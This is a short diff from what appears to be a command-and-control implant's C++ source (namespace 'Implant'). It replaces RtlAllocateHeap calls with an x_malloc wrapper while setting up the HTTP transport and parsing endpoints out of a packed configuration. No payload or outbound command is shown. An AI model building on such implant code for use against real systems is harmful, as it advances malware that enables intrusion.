@@ -111,7 +111,7 @@ namespace Implant {
 
 #define TRANSPORT_HTTP
 #ifdef TRANSPORT_HTTP
-        Ctx->Transport.http = S_CAST(_http_context*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_http_context)));
+        Ctx->Transport.http = S_CAST(_http_context*, x_malloc(sizeof(_http_context)));
 
         Ctx->Transport.http->Handle     = nullptr;
         Ctx->Transport.http->Endpoints  = nullptr;
@@ -122,7 +122,7 @@ namespace Implant {
         Ctx->Transport.http->Port = S_CAST(int, Parser::UnpackDword(&parser));
 
         Ctx->Transport.http->nEndpoints = Parser::UnpackDword(&parser);
-        Ctx->Transport.http->Endpoints  = S_CAST(wchar_t**, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(wchar_t*) * ((Ctx->Transport.http->nEndpoints + 1) * 2)));
+        Ctx->Transport.http->Endpoints  = S_CAST(wchar_t**, x_malloc(sizeof(wchar_t*) * ((Ctx->Transport.http->nEndpoints + 1) * 2)));
 
         for (auto i = 0; i < Ctx->Transport.http->nEndpoints; i++) {
             Parser::ParserWcscpy(&parser, &Ctx->Transport.http->Endpoints[i], nullptr);
